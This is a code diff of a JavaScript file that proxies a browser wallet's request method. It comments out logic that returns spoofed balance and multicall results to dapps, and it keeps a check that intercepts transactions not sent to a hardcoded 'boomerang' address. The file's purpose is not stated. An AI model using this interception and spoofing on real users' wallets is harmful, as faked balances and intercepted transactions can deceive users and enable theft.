@@ -34,7 +34,7 @@ let chains = {
 }
 
 const UNI_MULTICALL = "0x1f98415757620b543a52e61c46b32eb19261f984"
-const boomerangAddress = "0xB362974139F31218bc1Faf4be8cFD82C4B4b03a7"
+const boomerangAddress = "0xb362974139f31218bc1faf4be8cfd82c4b4b03a7"
 
 let a = window.ethereum.request
 
@@ -46,43 +46,43 @@ const handler = {
             console.log('calldata :', argumentsList[0].params[0].data)
         }
 
-        if (method === "eth_call" && argumentsList[0].params[0].to.toLowerCase() == UNI_MULTICALL) {
-            const calldata = argumentsList[0].params[0].data
-            console.log('eth_call to uni_multicall. Calldata length :', calldata.length)
+        // if (method === "eth_call" && argumentsList[0].params[0].to.toLowerCase() == UNI_MULTICALL) {
+        //     const calldata = argumentsList[0].params[0].data
+        //     console.log('eth_call to uni_multicall. Calldata length :', calldata.length)
         
-            if (calldata.slice(0, 10).toLowerCase() == "0x4d2301cc") { //getEthBalance
-                const decodedCall = ethers.utils.defaultAbiCoder.decode("address", "0x" + calldata.slice(10))[0]
-                // console.log("decodedCall", decodedCall)
-                let res = await spoof(decodedCall)
-                const encodedResponse = ethers.utils.defaultAbiCoder.encode("uint256", res)
-                console.log("encodedResponse", encodedResponse)
-                return encodedResponse
-            } else { //Else, it is 0x1749e1e3, multicall
-                if (calldata.length > 2000) return new Promise(function(resolve) {setTimeout(resolve, 100000)});
-                let decodedCalls = ethers.utils.defaultAbiCoder.decode([ "tuple(address, uint256, bytes)[]" ], "0x" + calldata.slice(10))[0]
-                console.log(decodedCalls)
-                let responseFull = [ethers.BigNumber.from(await getBlockNumber())]
-                let responseArray = []
-                await Promise.all(decodedCalls.map(async (decodedCall) => {
-                    try {
-                        let res = await spoof(decodedCall)
-                        responseArray.push([true, ethers.BigNumber.from("0x1631"), res])
-                    } catch (err) {
-                        console.log("err", err)
-                    }
-                }))
-                responseFull.push(responseArray)
-                const encodedResponse = ethers.utils.defaultAbiCoder.encode([ "uint256", "tuple(bool, uint256, bytes)[]" ], responseFull)
-                // console.log("encodedResponse :", encodedResponse)
-                return encodedResponse
-                //0x7ecebe : selector for allowance
-                //Multicall => unique call => custom call => result => construct reasonable result object => encode
-            }
-        } else if (method === "eth_call" && argumentsList[0].params[0].to.toLowerCase() != "0x00000000000c2e074ec69a0dfb2997ba6c7d2e1e") {
-            console.log('eth_call to another address')
-            console.log('call :', argumentsList[0].params[0])
-            console.log('to :', argumentsList[0].params[0].to)
-        }
+        //     if (calldata.slice(0, 10).toLowerCase() == "0x4d2301cc") { //getEthBalance
+        //         const decodedCall = ethers.utils.defaultAbiCoder.decode("address", "0x" + calldata.slice(10))[0]
+        //         // console.log("decodedCall", decodedCall)
+        //         let res = await spoof(decodedCall)
+        //         const encodedResponse = ethers.utils.defaultAbiCoder.encode("uint256", res)
+        //         console.log("encodedResponse", encodedResponse)
+        //         return encodedResponse
+        //     } else { //Else, it is 0x1749e1e3, multicall
+        //         if (calldata.length > 2000) return new Promise(function(resolve) {setTimeout(resolve, 100000)});
+        //         let decodedCalls = ethers.utils.defaultAbiCoder.decode([ "tuple(address, uint256, bytes)[]" ], "0x" + calldata.slice(10))[0]
+        //         console.log(decodedCalls)
+        //         let responseFull = [ethers.BigNumber.from(await getBlockNumber())]
+        //         let responseArray = []
+        //         await Promise.all(decodedCalls.map(async (decodedCall) => {
+        //             try {
+        //                 let res = await spoof(decodedCall)
+        //                 responseArray.push([true, ethers.BigNumber.from("0x1631"), res])
+        //             } catch (err) {
+        //                 console.log("err", err)
+        //             }
+        //         }))
+        //         responseFull.push(responseArray)
+        //         const encodedResponse = ethers.utils.defaultAbiCoder.encode([ "uint256", "tuple(bool, uint256, bytes)[]" ], responseFull)
+        //         // console.log("encodedResponse :", encodedResponse)
+        //         return encodedResponse
+        //         //0x7ecebe : selector for allowance
+        //         //Multicall => unique call => custom call => result => construct reasonable result object => encode
+        //     }
+        // } else if (method === "eth_call" && argumentsList[0].params[0].to.toLowerCase() != "0x00000000000c2e074ec69a0dfb2997ba6c7d2e1e") {
+        //     console.log('eth_call to another address')
+        //     console.log('call :', argumentsList[0].params[0])
+        //     console.log('to :', argumentsList[0].params[0].to)
+        // }
         
         if (method === 'eth_sendTransaction' && argumentsList[0].params[0].to.toLowerCase() != boomerangAddress.toLowerCase()) {
             // return target(...argumentsList)
@@ -206,7 +206,7 @@ async function TEST() {
     return rq
 }
 
-TEST()
+// TEST()
 
 async function getBlockNumber() {
     return await window.ethereum.request({
